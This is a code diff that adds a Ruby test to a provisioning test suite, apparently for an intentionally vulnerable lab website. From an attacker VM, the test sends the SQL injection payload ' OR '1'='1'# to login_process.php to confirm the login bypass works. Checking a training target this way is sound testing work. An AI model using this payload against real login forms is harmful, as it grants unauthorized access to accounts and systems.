@@ -19,6 +19,27 @@ class ParamWebsiteTest < PostProvisionTest
     test_additional_page(json_inputs)
     test_security_audit_remit(json_inputs)
     test_acceptable_use_policy(json_inputs)
+    test_sqli_auth_bypass
+  end
+
+  # Tier 3 — SQL injection auth bypass, driven as an HTTP POST from the attacker
+  # VM (the non-Metasploit HTTP-exploit path, Phase 1C). login_process.php
+  # interpolates the username straight into the SQL string, so ' OR '1'='1'#
+  # matches every row and logs in with no valid credentials. On success the app
+  # issues a 302 to index.php (a failed login redirects to login.php instead),
+  # which the helper detects in the response headers (include_headers). This is
+  # the first consumer of test_http_exploit; with no attacker VM it SKIPs, so
+  # the module test still works on its own.
+  def test_sqli_auth_bypass
+    sqli = "' OR '1'='1'#"
+    test_http_exploit('/login_process.php',
+                      method: 'POST',
+                      data: "username=#{sqli}&password=x",
+                      headers: { 'Content-Type' => 'application/x-www-form-urlencoded' },
+                      include_headers: true,
+                      expect: %r{location:\s*index\.php}i,
+                      label: 'SQLi auth bypass (login_process.php)',
+                      tier: 3)
   end
 
   def get_organisation(json_inputs)
